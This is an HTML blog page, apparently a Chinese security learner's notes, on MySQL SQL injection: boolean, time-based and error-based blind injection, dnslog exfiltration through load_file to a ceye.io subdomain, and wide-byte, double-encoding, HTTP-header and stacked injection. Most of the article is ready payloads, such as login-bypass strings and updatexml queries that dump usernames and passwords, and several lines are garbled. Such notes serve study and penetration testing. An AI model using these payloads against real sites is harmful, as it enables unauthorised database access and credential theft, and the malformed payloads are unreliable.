@@ -1,0 +1,514 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8" />
+    <title> | 剣の魔王の小窝</title>
+    <meta name="author" content="剣の魔王" />
+    <meta name="description" content="这个网站没有描述" />
+    <meta name="keywords" content="" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <link rel="icon" href="/images/head.png" />
+    <link rel="preconnect" href="https://s4.zstatic.net" />
+<script src="https://s4.zstatic.net/ajax/libs/vue/3.3.7/vue.global.prod.min.js"></script>
+<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/font-awesome/6.4.2/css/all.min.css" />
+<link rel="preconnect" href="https://fonts.loli.net" />
+<link rel="preconnect" href="https://gstatic.loli.net" crossorigin />
+<link rel="stylesheet" href="https://fonts.loli.net/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap" />
+<script> const mixins = {}; </script>
+
+<script src="https://polyfill.io/v3/polyfill.min.js?features=default"></script>
+
+
+<script src="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script src="https://s4.zstatic.net/ajax/libs/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
+<link
+    rel="stylesheet"
+    href="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/styles/github.min.css"
+/>
+<script src="/js/lib/highlight.js"></script>
+
+
+<script src="https://s4.zstatic.net/ajax/libs/KaTeX/0.16.9/katex.min.js"></script>
+<script src="https://s4.zstatic.net/ajax/libs/KaTeX/0.16.9/contrib/auto-render.min.js"></script>
+<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/KaTeX/0.16.9/katex.min.css" />
+<script src="/js/lib/math.js"></script>
+
+
+<script src="/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+<script src="https://cdn.staticfile.org/animejs/3.2.1/anime.min.js"></script>
+<link rel="stylesheet" href="/css/main.css" />
+<link rel="preconnect" href="https://static-argvchs.netlify.app" />
+
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+
+			<canvas
+			id="fireworks"
+			style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; pointer-events: none; z-index: 32767">
+			</canvas>
+			<script src="https://s4.zstatic.net/ajax/libs/animejs/3.2.1/anime.min.js"></script>
+			<script src="/js/lib/fireworks.min.js"></script>
+			
+			<canvas
+			id="background"
+			style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; pointer-events: none; z-index: -1"></canvas>
+			<script src="/js/lib/background.min.js"></script>
+
+    <div id="layout">
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>加载过慢请开启缓存 浏览器默认开启</p>
+                    <img src="/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
+    <nav id="desktop-menu">
+        <a class="title" href="/">
+            <span>剣の魔王の小窝</span>
+        </a>
+        
+        <a href="/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+    </nav>
+    <nav id="mobile-menu">
+        <div class="title" @click="showMenuItems = !showMenuItems">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;剣の魔王の小窝</span>
+        </div>
+        <transition name="slide">
+            <div class="items" v-show="showMenuItems">
+                
+                <a href="/">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-house fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                    </div>
+                </a>
+                
+                <a href="/about">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-id-card fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                    </div>
+                </a>
+                
+                <a href="/archives">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-box-archive fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                    </div>
+                </a>
+                
+                <a href="/categories">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-bookmark fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                    </div>
+                </a>
+                
+                <a href="/tags">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-tags fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                    </div>
+                </a>
+                
+            </div>
+        </transition>
+    </nav>
+</div>
+<transition name="fade">
+    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
+</transition>
+
+        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
+            <div class="article">
+    <div>
+        <h1></h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2024/5/5
+        </span>
+        
+        
+    </div>
+    
+    <div class="content" v-pre>
+        <h3 id="SQL-注入报错盲注"><a href="#SQL-注入报错盲注" class="headerlink" title="SQL 注入报错盲注"></a>SQL 注入报错盲注</h3><p>盲注就是在注入过程中，获取的数据不能回显至前端页面。此时，我们需要利用一些方法进行判断<br>或者尝试，这个过程称之为盲注。我们可以知道盲注分为以下三类：</p>
+<p><strong><span id="more"></span></strong></p>
+<h4 id="1）基于布尔的-SQL-盲注-逻辑判断"><a href="#1）基于布尔的-SQL-盲注-逻辑判断" class="headerlink" title="1）基于布尔的 SQL 盲注-逻辑判断"></a>1）基于布尔的 SQL 盲注-逻辑判断</h4><p>regexp,like,ascii,left,ord,mid</p>
+<p><strong>布尔盲注原理</strong></p>
+<p>只返回布尔值的sql注入漏洞，通过构造语句,来判断数据库信息的正确性,再通过页面反回的布尔值,来判断正确与否</p>
+<pre><code>#substr()函数,截取某个字符串，与后面的字符串或数字对比
+k&#39; and substr((select database()),1,1)=&#39;s&#39;
+#left()函数,截取前几个字符与期望值对比
+k&#39; and left((database()),1)=&#39;s&#39;
+#regexp函数,用正则判断
+k&#39; and select user() regexp &#39;^r&#39;
+#like函数
+k&#39; and select user() like &#39;ro%&#39;
+# 爆破库、表、字段长度
+k&#39; and select length(database())&lt;xx
+
+#有些sql漏洞中,会屏蔽引号,因此更多采用将截取出来的字符串转为ascii码,再对比ascii码值
+#ascii和ord函数功能相同,大于、小于、等于配合二分法使用
+k&#39; and ascii(substr((select database()),1,1))=114
+k&#39; and ascii(substr((select database()),1,1))&gt;114
+k&#39; and ascii(substr((select database()),1,1))&lt;20
+
+ord(substr((select database()),1,1))=114
+</code></pre>
+<h4 id="2）基于时间的-SQL-盲注-延时判断"><a href="#2）基于时间的-SQL-盲注-延时判断" class="headerlink" title="2）基于时间的 SQL 盲注-延时判断"></a>2）基于时间的 SQL 盲注-延时判断</h4><p>if,sleep</p>
+<p><strong>时间盲注原理</strong></p>
+<p>语句执行后,不回显,不报错,不提示真假的sql注入漏洞。可以通过构造语句,通过条件语句判断,为真则立即执行,否则延时执行</p>
+<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240330-102409.png" alt="if"></p>
+<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240330-102416.png" alt="sleep"></p>
+<pre><code>#确实是否有注入点，如果相应时间是自定义的睡眠时间，则大概率有注入点
+k&#39; and sleep(x) #
+#然后通过之前的函数，猜测库、表、字段
+k&#39; and if(ascii(substr(database(),1,1))&gt;115,0,sleep(5));
+
+#也可以先通过sleep计算出库、表、字段长度
+k&#39; and sleep(length(database()))
+</code></pre>
+<h4 id="3）基于报错的-SQL-盲注-报错回显"><a href="#3）基于报错的-SQL-盲注-报错回显" class="headerlink" title="3）基于报错的 SQL 盲注-报错回显"></a><strong>3）基于报错的 SQL 盲注-报错回显</strong></h4><p>floor，updatexml，extractvalue</p>
+<pre><code>1、通过floor报错,注入语句如下:
+and select 1 from (select count(),concat(version(),floor(rand(0)2))x from information_schema.tables group by x)a);
+
+2、通过ExtractValue报错,注入语句如下:
+and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1)));
+
+3、通过UpdateXml报错,注入语句如下:
+and 1=(updatexml(1,concat(0x3a,(select user())),1))
+
+4、通过NAME_CONST报错,注入语句如下:
+and exists(selectfrom (selectfrom(selectname_const(@@version,0))a join (select name_const(@@version,0))b)c)
+
+5、通过join报错,注入语句如下:
+select * from(select * from mysql.user ajoin mysql.user b)c;
+
+6、通过exp报错,注入语句如下:
+and exp(~(select * from (select user () ) a) );
+
+7、通过GeometryCollection()报错,注入语句如下:
+and GeometryCollection(()select *from(select user () )a)b );
+
+8、通过polygon ()报错,注入语句如下:
+and polygon (()select * from(select user ())a)b );
+
+9、通过multipoint ()报错,注入语句如下:
+and multipoint (()select * from(select user() )a)b );
+
+10、通过multlinestring ()报错,注入语句如下:
+and multlinestring (()select * from(selectuser () )a)b );
+
+11、通过multpolygon ()报错,注入语句如下:
+and multpolygon (()select * from(selectuser () )a)b );
+
+12、通过linestring ()报错,注入语句如下:
+and linestring (()select * from(select user() )a)b );
+
+常用的万能username语句：
+a ’ or 1=1 #
+a &quot;) or 1=1 #
+a‘) or 1=1 #
+a” or “1”=”1
+&#39; or &#39;1&#39;=&#39;1
+&#39; or (length(database())) = 8 (用于输入’ “都没有错误)
+&#39; or (ascii(substr((select database()) ,1,1))) = 115 # (用于输入’ “都没有错误)
+&quot;) or (&quot;1&quot;)=(&quot;1
+&quot;) or 1=1 or if(1=1, sleep(1), null) #
+&quot;) or (length(database())) = 8 #
+&quot;) or (ascii(substr((select database()) ,1,1))) = 115 or if(1=1, sleep(1), null) #
+
+post型盲注通杀payload：uname=admin%df&#39;or()or%200%23&amp;passwd=&amp;submit=Submit
+
+
+关于UPDATEXML,REFERER,COOKIE的构造
+User-Agent:.........&#39; or updatexml(1,concat(0x7e,database(),0x7e),1),”,”) #
+Referer: ’ or updatexml(1,concat(0x7e,database(),0x7e),1),”,”) #
+Cookie:username: admin ’ or updatexml(1,concat(0x7e,database(),0x7e),1) #
+
+updatexml报错注入
+爆数据库版本信息：?id=1 and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)
+链接用户：?id=1 and updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)
+链接数据库：?id=1 and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)
+爆库：?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e, (select schema_name),0x7e) FROM admin limit 0,1),0x7e),1)
+爆表：?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e, (select table_name),0x7e) FROM admin limit 0,1),0x7e),1)
+爆字段：?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e, (select column_name),0x7e) FROM admin limit 0,1),0x7e),1)
+爆字段内容：?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM admin limit 0,1),0x7e),1)
+</code></pre>
+<pre><code>参考：
+
+like &#39;ro%&#39;                #判断 ro 或 ro...是否成立
+regexp &#39;^xiaodi[a-z]&#39;     #匹配 xiaodi 及 xiaodi...等
+if(条件,5,0)              #条件成立 返回 5 反之 返回 0
+sleep(5)                  #SQL 语句延时执行 5 秒
+mid(a,b,c)                #从位置 b 开始，截取 a 字符串的 c 位
+substr(a,b,c)             #从 b 位置开始，截取字符串 a 的 c 长度
+left(database(),1)，database()       #left(a,b)从左侧截取 a 的前 b 位
+length(database())=8      #判断数据库 database()名的长度
+ord=ascii ascii(x)=97     #判断 x 的 ascii 码是否等于 9
+</code></pre>
+<p><strong>floor()：MySQL 中用来取整的函数</strong></p>
+<pre><code>select count(*) from information_schema.tables group by concat((select version())),floor(rang(0)*2);
+#concat 连接字符串功能
+#floor  取float的整数值
+#rang   取0-1之间随机浮点值
+#group by   对结果集进行排序
+select verson()就是我们用来做sql注入的语句
+</code></pre>
+<p><strong>extractvalue()：MySQL 对 XML 文档数据进行查询的 XPATH 函数</strong></p>
+<pre><code>select extractvalue(1,concat(0x7e,(select user()),0x7e));
+#extractvalue():接收2个参数,第一个xml文档,第二个xpath语句
+#用concat构造一个错误的xpath字符串,使extractvalue函数报错,显示出构造的&#39;错误&#39;字符串
+</code></pre>
+<p><strong>updatexml()：MySQL 对 XML 文档数据进行查询和修改的 XPATH 函数</strong></p>
+<pre><code>select updatexml(1,concat(0x7e,(select user()),0x7e),1)
+#接收3个参数,第一个xml文档,第二个xpath语句,第三个字符串
+#原理和extravtvalue一样,构造错误的xpath语句报错
+</code></pre>
+<h4 id="updatexml报错实战"><a href="#updatexml报错实战" class="headerlink" title="updatexml报错实战"></a><strong>updatexml报错实战</strong></h4><p>select、delete语句注入</p>
+<pre><code>#1 爆数据库版本信息
+k&#39; and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1) #
+#2 爆数据库当前用户
+k&#39; and  updatexml(1,concat(0x7e,(SELECT user()),0x7e),1) #
+#3 爆数据库
+k&#39; and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1) #
+#4 爆表名
+## 反馈回的错误表示只能显示一行，所以采用limit来一行一行显示
+k&#39;and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#39;pikachu&#39;)),0) #
+#5 爆字段
+k&#39; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#39;users&#39;limit 2,1)),0) #
+#6 爆字段内容
+k&#39; and  updatexml(1,concat(0x7e,(select password from users limit 0,1)),0) #
+</code></pre>
+<p>insert、update、注入<br>增、改同样可以用来进行报错注入，只是需要前后分别用or语句连接，使语句完整，一般需要抓包用bp改参数</p>
+<pre><code># 原语句
+insert into xxx id values (&#39;k&#39;);
+# 报错注入语句
+k&#39; or updatexml(1,concat(0x7e,(命令)),0) or&#39;
+# 组合后语句
+insert into xxx id values (&#39;k&#39; or updatexml(1,concat(0x7e,(命令)),0) or&#39;&#39;);
+</code></pre>
+<p>head和cookie注入<br>如果代码调用了head或cookie中的信息拿到数据库进行拼接，也可以用报错注入尝试<br>同样是先用单引号找到注入点，在进行注入</p>
+<pre><code># http head头注入，假如是对浏览器类型的检测
+Mozilla &#39; or updatexml(1,concat(0x7e,database ()),0) or &#39;
+# cookie注入，假如原cookie为 ant[uname]=admin
+ant[uname]=admin&#39; and updatexml (1,concat(0x7e,database()),0) #
+</code></pre>
+<h4 id="3）dnslog盲注"><a href="#3）dnslog盲注" class="headerlink" title="3）dnslog盲注"></a><strong>3）dnslog盲注</strong></h4><h5 id="dnslog盲注原理"><a href="#dnslog盲注原理" class="headerlink" title="dnslog盲注原理"></a>dnslog盲注原理</h5><ol>
+<li>首先需要存在sql注入漏洞,但不回显,常规只能用布尔盲注和时间盲注猜单词</li>
+<li>但是利用<code>Mysql load_file()</code>函数(唯windows),可以用sql语句发起web请求</li>
+<li>将我们盲注需要获取的信息,通过二级域名的方式,发起web请求</li>
+<li>利用特定的dns解析网站,获取这些二级域名的记录,就能得到数据</li>
+</ol>
+<p>前提要求</p>
+<ol>
+<li>windows系统</li>
+<li>该用户具有file权限</li>
+<li><code>SHOW VARIABLES LIKE &#39;secure_file_priv&#39;</code>结果为NULL</li>
+</ol>
+<h5 id="dnslog盲注方法"><a href="#dnslog盲注方法" class="headerlink" title="dnslog盲注方法"></a>dnslog盲注方法</h5><p>登录<code>http://ceye.io/</code>网站并注册，得到属于自己的identifier 先尝试在终端运行<code>curl test.xxxx.ceye.io</code> ,在解析记录就可以看到对应记录 在windows系统下,使用<code>load_file()</code>发起如下类似请求:</p>
+<pre><code>select load_file(concat(&#39;\\\\&#39;,(select version()),&#39;.xxxx.ceye.io\\abc&#39;))
+</code></pre>
+<p>如果解析记录有结果,后续就可以用sql注入的其他语法自由发挥了 有些特殊符号不能作为二级域名,通用的方法是用<code>hex()</code>转换为16进制处理</p>
+<h4 id="4）宽字节注入"><a href="#4）宽字节注入" class="headerlink" title="4）宽字节注入"></a>4）<strong>宽字节注入</strong></h4><p>原理：在对单双引号进行了转义过滤的情况下,前面的注入方式都不好使,但可以在引号前加上<code>%df</code>再进行sql注入尝试<br>它的原理是</p>
+<ol>
+<li><code>\&#39;</code>编码后的值为<code>%5C%27</code></li>
+<li>使用GBK编码数据库时,两个字符为一个汉字</li>
+<li>ASCII码只有128个,大于128的,就会和第二个字符组成一个汉字</li>
+<li>使用<code>%df\&#39;</code>,编码后为<code>%df%5C%27</code><br>第一个码大于128,因此会使用前两个字符<code>運</code>,最后单剩一个引号<br>即编码后的值为<code>運&#39;</code></li>
+<li>然后就可以正常进行sql注入了</li>
+</ol>
+<h5 id="宽字节注入方法"><a href="#宽字节注入方法" class="headerlink" title="宽字节注入方法"></a><strong>宽字节注入方法</strong></h5><p>黑盒测试的话:在可能的注入点后,键入<code>%df&#39;</code>后,进行测试<br>白合测试的话:</p>
+<ol>
+<li>查看mysql编码是否为GBK</li>
+<li>是否使用<code>preg_replace</code>转换单引号为<code>\&#39;</code></li>
+<li>是否使用addslashes进行转义</li>
+<li>是否使用mysql_real_escape_string进行转义</li>
+</ol>
+<h4 id="5）二次编码注入"><a href="#5）二次编码注入" class="headerlink" title="5）二次编码注入"></a><strong>5）二次编码注入</strong></h4><p>原理：</p>
+<ol>
+<li>用户输入<code>id=1%27</code>,会被php转码为<code>id=1&#39;</code></li>
+<li>转义代码发现有单引号,转义为<code>id=1\&#39;</code>,无法sql注入</li>
+<li>用户输入<code>id=1%2527</code>,由于%25转码后就是%,因而会转码为<code>id=1%27</code></li>
+<li>转义代码没有发现单引号,故不转义</li>
+<li>但后续urldecode等函数,处理url时,会将<code>id=1%27</code>转码为<code>id=1&#39;</code>,就可以注入<br>注意:如果做白盒测试,要看urldecode函数 是否在转义方法之后</li>
+</ol>
+<p>举例1如下:</p>
+<ol>
+<li>新建用户<code>admin&#39;#</code>,有特殊字符,但写入成功,并能使用该用户登录</li>
+<li>正常修改用户密码时<br>sql语句如是:<code>update user set password=&#39;1234&#39; where username=&#39;x&#39; and psssword=&#39;xx&#39;</code></li>
+<li>但当用户为<code>admin&#39;#</code>时<br>sql语句变为:<code>update user set password=&#39;1234&#39; where username=&#39;admin&#39;#&#39; and xxxxx</code><br>明显井号后的语句都被注释掉了</li>
+<li>结果就是会修改掉原有用户admin的密码</li>
+</ol>
+<p>举例2如下:</p>
+<ol>
+<li>有两个页面,一个页面写入数据,另一个页面可以有办法查看该数据</li>
+<li>如果写入时,写入了<code>xx&#39; union select 1,database(),3</code></li>
+<li>如果存在sql注入漏洞,写入的数据应该为<code>1,库名,3</code></li>
+<li>在另一个页面就可以看到该库名数据</li>
+</ol>
+<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240330-162912.png" alt="在这里插入图片描述"></p>
+<h4 id="6）HTTP头注入"><a href="#6）HTTP头注入" class="headerlink" title="6）HTTP头注入"></a><strong>6）HTTP头注入</strong></h4><h5 id="1、UserAgent注入"><a href="#1、UserAgent注入" class="headerlink" title="1、UserAgent注入"></a>1、UserAgent注入</h5><pre><code>User-Agent:hacker&#39; and updatexml(1,concat(0xx5e,version(),0x5e),1) and &#39;1&#39;=&#39;1
+</code></pre>
+<h5 id="2、Referer-注入"><a href="#2、Referer-注入" class="headerlink" title="2、Referer 注入"></a>2、Referer 注入</h5><pre><code>Referer:hacker&#39; and updatexml(1,concat(0x5e,version(),0x5e),1) and &#39;1&#39;=&#39;1
+</code></pre>
+<h5 id="3、X-Forwarded-For注入"><a href="#3、X-Forwarded-For注入" class="headerlink" title="3、X-Forwarded-For注入"></a>3、X-Forwarded-For注入</h5><p>X-Forwarded-For（XFF）是用来识别通过HTTP代理或负载均衡方式连接到Web服务器的客户端最原始的IP地址的HTTP请求头字段。</p>
+<p>如果系统采用了服务器后端获取 X-Forwarded-For数据，如：利用String ip = request.getHeader(“X-Forwarded-For”);进行获取ip，攻击者可以通过X-Forwarded-For请求头信息就行伪造ip，当然了这个ip也可以是一些注入语句，如下：</p>
+<pre><code>X-Forwarded-For：1 and if(now()=sysdate(),sleep(6),0)-- 
+String sql = &quot;select * from table where ip = &#39;&quot;+ip+&quot;&#39;&quot;;
+</code></pre>
+<p>构造X-Forwoarded-For头进行测试，http响应出现变化：</p>
+<pre><code>X-Forwarded-For: -1&#39; OR 3*2*1=6 AND 000958=000958--
+X-Forwarded-For: -1&#39; OR 3*2*1=6 AND 000958=000957--
+</code></pre>
+<p>由此可以判定可能存在注入漏洞的</p>
+<h4 id="7）堆叠注入"><a href="#7）堆叠注入" class="headerlink" title="7）堆叠注入"></a><strong>7）堆叠注入</strong></h4><p>mysql数据库sql语句的默认结束符是以”;”号结尾，在执行多条sql语句时就要使用结束符隔<br>开,而堆叠注入其实就是通过结束符来执行多条sql语句</p>
+<p>比如我们在mysql的命令行界面执行一条查询语句,这时语句的结尾必须加上分号结束</p>
+<pre><code>select * from student;
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240330-163139.png" alt="HTWwvV.png"></p>
+<p>如果我们想要执行多条sql那就用结束符分号进行隔开,比如在查询的同时查看当前登录用户是谁</p>
+<pre><code>select * from student;select current_user();
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240330-163207.png" alt="HThjHS.png"></p>
+<h5 id="堆叠注入触发条件"><a href="#堆叠注入触发条件" class="headerlink" title="堆叠注入触发条件"></a>堆叠注入触发条件</h5><p>堆叠注入触发的条件很苛刻,因为堆叠注入原理就是通过结束符同时执行多条sql语句,这就需要服务器在访问数据端时使用的是可同时执行多条sql语句的方法,比如php中mysqli_multi_query()函数,这个函数在支持同时执行多条sql语句,而与之对应的mysqli_query()函数一次只能执行一条sql语句,所以要想目标存在堆叠注入,在目标主机没有对堆叠注入进行黑名单过滤的情况下必须存在类似mysqli_multi_query()这样的函数,简单总结下来就是</p>
+<ol>
+<li>目标存在sql注入漏洞</li>
+<li>目标未对”;”号进行过滤</li>
+<li>目标中间层查询数据库信息时可同时执行多条sql语句</li>
+</ol>
+<p>参考链接：</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_74169008/article/details/130768550">【小迪安全】完整详细笔记01-39天-CSDN博客</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_48904485/article/details/123628523">SQL注入详解-CSDN博客</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.kancloud.cn/noahs/src_hacker/2394999">SQL盲注 · 白帽与安全 · 看云 (kancloud.cn)</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.kancloud.cn/noahs/src_hacker/2395000">其他注入方式 · 白帽与安全 · 看云 (kancloud.cn)</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_42566218/article/details/122998991">sql注入之堆叠注入-CSDN博客</a></p>
+
+    </div>
+    
+    
+    
+    
+    <div id="comment">
+        <div id="giscus-container" class="giscus"></div>
+    </div>
+    
+    
+    
+    
+</div>
+
+            <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2024 剣の魔王の小窝
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;剣の魔王
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/js/main.js"></script>
+    <script>
+        console.info("Welcome to Argvchs' blog!");
+        if (!window.hasOwnProperty("ontouchstart")) {
+            let html = '<canvas id="fireworks" style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; pointer-events: none; z-index: 32767"></canvas><script src="https://static-argvchs.netlify.app/js/fireworks.min.js"><\/script>';
+            document.body.append(document.createRange().createContextualFragment(html));
+        }
+    </script>
+    
+    
+<script
+    src="https://giscus.app/client.js"
+    data-repo="argvchs/giscus-comments"
+    data-repo-id="R_kgDOI_uC-w"
+    data-category="Announcements"
+    data-category-id="DIC_kwDOI_uC-84CUToF"
+    data-mapping="pathname"
+    data-strict="1"
+    data-reactions-enabled="1"
+    data-emit-metadata="0"
+    data-input-position="bottom"
+    data-theme="https://static-argvchs.netlify.app/css/giscus.css"
+    data-lang="zh-CN"
+    crossorigin
+    async
+></script>
+
+
+
+
+
+    
+</body>
+</html>
